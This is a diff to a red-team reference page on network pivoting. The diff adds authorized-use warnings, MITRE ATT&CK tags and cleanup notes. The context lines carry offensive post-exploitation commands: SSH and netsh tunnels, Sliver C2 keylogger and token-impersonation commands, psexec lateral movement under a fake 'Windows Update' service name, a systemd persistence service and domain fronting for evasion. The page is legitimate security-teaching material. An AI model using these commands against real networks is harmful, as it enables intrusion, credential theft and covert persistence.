@@ -3,7 +3,7 @@ id: pivoting-guide
 title: "Comprehensive Network Pivoting in Adversarial Operations"
 sidebar_label: "Network Pivoting"
 sidebar_position: 1
-description: "An exhaustive academic reference analyzing network pivoting methodologies, tools, and techniques for penetration testing and red team operations"
+description: "Reference guide for network pivoting methodologies, tools, and techniques used in authorized penetration testing and red team post-exploitation operations."
 keywords:
   - network pivoting
   - lateral movement
@@ -28,7 +28,13 @@ tags: [Pivoting]
 
 This comprehensive academic reference presents an exhaustive analysis of network pivoting methodologies, tools, and techniques employed in modern adversarial operations. We examine seventeen primary pivoting frameworks across multiple platforms, providing detailed implementation examples, operational security considerations, and advanced detection evasion techniques. This manual serves as both theoretical foundation and practical implementation guide for cybersecurity researchers and practitioners.
 
+:::warning Authorized Use Only
+This document covers post-exploitation pivoting techniques. All methods described assume you are operating within an **authorized engagement** (signed rules of engagement, defined scope). Applying these techniques against systems you do not have explicit written permission to test is illegal. Stop if your ROE does not cover the target segment.
+:::
+
 ## 1. Introduction
+
+This guide covers the tools and techniques used to traverse segmented networks once an initial foothold is established. Use it when you have a compromised host and need to reach isolated internal segments — not for initial access or pre-authorization reconnaissance.
 
 Network pivoting constitutes the foundational technique for lateral movement within segmented network infrastructures. This methodology enables adversaries to leverage compromised intermediary systems as communication conduits to access otherwise isolated network segments, effectively circumventing perimeter defenses and network isolation policies.
 
@@ -106,6 +112,10 @@ Each pivoting methodology is evaluated across seven critical dimensions:
 Evaluation criteria are based on operational field experience, security research publications, and comparative analysis of tool capabilities in controlled environments. Ratings represent relative assessments under typical deployment scenarios and may vary based on specific implementation, configuration, and defensive posture of target networks.
 :::
 
+:::note Tool Version Volatility
+Chisel, Ligolo-ng, Sliver, and Havoc evolve quickly. Verify flag names, agent-relay syntax, and listener options against current GitHub READMEs before use — these change between minor versions and the examples below may not reflect the latest CLI surface.
+:::
+
 ### 1.4 Tool Selection Decision Framework
 
 The following flowchart provides a systematic approach for selecting appropriate pivoting tools based on operational constraints:
@@ -171,7 +181,7 @@ SSH represents the most ubiquitous and well-documented pivoting mechanism, lever
 
 ### 2.1 Local Port Forwarding
 
-Local port forwarding establishes a listening port on the client machine that forwards connections to a destination through the SSH server:
+Local port forwarding establishes a listening port on the client machine that forwards connections to a destination through the SSH server (MITRE ATT&CK [T1090](https://attack.mitre.org/techniques/T1090/) — Proxy):
 
 ```bash
 # Basic local port forwarding
@@ -213,7 +223,7 @@ ssh -R 3306:database_server:3306 user@pivot_host
 
 ### 2.3 Dynamic Port Forwarding (SOCKS Proxy)
 
-Dynamic port forwarding establishes a SOCKS proxy server on the client machine:
+Dynamic port forwarding establishes a SOCKS proxy server on the client machine (MITRE ATT&CK [T1572](https://attack.mitre.org/techniques/T1572/) — Protocol Tunneling):
 
 ```bash
 # Basic SOCKS proxy on port 9050
@@ -270,7 +280,7 @@ ssh -o ProxyCommand='nc --proxy-type socks5 --proxy socks_proxy:1080 %h %p' user
 Ensure the Chisel binary is available on both server and client machines before executing these commands. Replace server_ip, username:password, ports, and interface names to match your environment.
 :::
 
-Chisel implements a fast TCP/UDP tunnel transported over HTTP, secured via SSH-like encryption, optimized for restrictive network environments.
+Chisel implements a fast TCP/UDP tunnel transported over HTTP, secured via SSH-like encryption, optimized for restrictive network environments (MITRE ATT&CK [T1572](https://attack.mitre.org/techniques/T1572/) — Protocol Tunneling).
 
 ### 3.1 Server Configuration and Management
 
@@ -894,8 +904,8 @@ sliver (session) > keylogger dump
 # Token manipulation
 sliver (session) > impersonate [username]
 
-# Lateral movement via psexec
-sliver (session) > psexec --host 192.168.2.101 --service-name "UpdateService" --service-desc "Windows Update"
+# Lateral movement via remote services (MITRE ATT&CK T1021 — Remote Services)
+sliver (session) > psexec 192.168.2.101 --service-name "UpdateService" --service-description "Windows Update" --profile win-beacon
 ```
 
 ### 8.6 Beacon Management
@@ -967,7 +977,7 @@ These sections assume you have administrative privileges on the Windows host. Su
 
 ### 9.1 Netsh Port Forwarding
 
-Windows netsh provides native port forwarding capabilities without requiring additional tools:
+Windows netsh provides native port forwarding capabilities without requiring additional tools (MITRE ATT&CK [T1090](https://attack.mitre.org/techniques/T1090/) — Proxy):
 
 ```cmd
 # Enable IP forwarding
@@ -991,6 +1001,14 @@ netsh interface portproxy reset
 # Advanced rule with specific interface
 netsh interface portproxy add v4tov4 listenport=443 listenaddress=192.168.1.100 connectport=443 connectaddress=10.0.0.100
 ```
+
+:::warning Persistent State
+`netsh interface portproxy` rules **survive reboots** — they are written to the registry. Clean up after your engagement:
+```cmd
+netsh interface portproxy reset
+```
+or remove individual rules with `netsh interface portproxy delete v4tov4 listenport=<port> listenaddress=<addr>`.
+:::
 
 ### 9.2 Plink (PuTTY Link) Implementation
 
@@ -1139,7 +1157,11 @@ connect = server_ip:443
 
 ### 10.4 dnscat2: DNS Tunneling
 
-dnscat2 provides covert communication through DNS queries:
+:::note Legacy Tool
+dnscat2 is considered legacy for most engagements. By 2026, DNS-over-HTTPS (DoH) is enabled by default in most modern resolvers and enterprise stacks, which breaks traditional dnscat2 DNS tunneling and makes it easily flagged at the network boundary. Prefer HTTPS-based tunnels (Chisel, Ligolo-ng) unless the environment specifically lacks DoH enforcement.
+:::
+
+dnscat2 provides covert communication through DNS queries (MITRE ATT&CK [T1572](https://attack.mitre.org/techniques/T1572/) — Protocol Tunneling):
 
 ```bash
 # Server setup
@@ -1286,7 +1308,7 @@ The following examples combine multiple pivoting techniques and assume prior est
 
 Effective pivot chaining requires systematic network mapping and route optimization across multiple security boundaries:
 
-```
+```text
 Internet → DMZ Host → Internal Network → Workstation → Restricted Network → Critical Server
 ```
 
@@ -1335,7 +1357,7 @@ sequenceDiagram
 
 1. **Initial Foothold**: Compromise externally accessible system
 2. **Network Reconnaissance**: Enumerate internal network topology
-3. **Lateral Movement**: Establish additional compromised hosts
+3. **Lateral Movement**: Establish additional compromised hosts — credential theft often precedes this step (see [Brute Force & Credential Attacks](../cyber/bruteforce_guide.md))
 4. **Route Optimization**: Configure efficient traffic routing
 5. **Persistence**: Maintain reliable communication channels
 
@@ -1539,7 +1561,7 @@ int main() {
 
 ### 14.4 Advanced Evasion Techniques
 
-#### Domain Fronting:
+#### Domain Fronting (MITRE ATT&CK [T1205](https://attack.mitre.org/techniques/T1205/) — Traffic Signaling):
 
 ```bash
 # Use legitimate CDN for traffic fronting
@@ -1578,10 +1600,19 @@ Adapt scripts, service definitions, and persistence mechanisms to your platform 
 ### 15.1 Linux-Specific Techniques
 
 ```bash
-# iptables-based port forwarding
+# iptables-based port forwarding (MITRE ATT&CK T1090 — Proxy)
 iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.100:80
 iptables -t nat -A POSTROUTING -j MASQUERADE
+```
 
+:::warning Persistent State
+These `iptables` rules are not saved by default on most distros but may persist if `iptables-save` / `netfilter-persistent` is in use. Flush NAT rules after your engagement:
+```bash
+iptables -t nat -F
+```
+:::
+
+```bash
 # systemd service for persistence
 cat > /etc/systemd/system/tunnel.service << EOF
 [Unit]
@@ -1644,6 +1675,8 @@ Network defenders should monitor for the following indicators:
 - HTTP traffic with suspicious user agents or headers
 - DNS queries to unusual domains or with high frequency
 - TLS connections to self-signed or suspicious certificates
+
+For traffic capture and analysis during pivoting operations, see [PCAP Analysis Guide](../cyber/pcap_guide.md).
 
 ### 16.2 Defensive Countermeasures
 
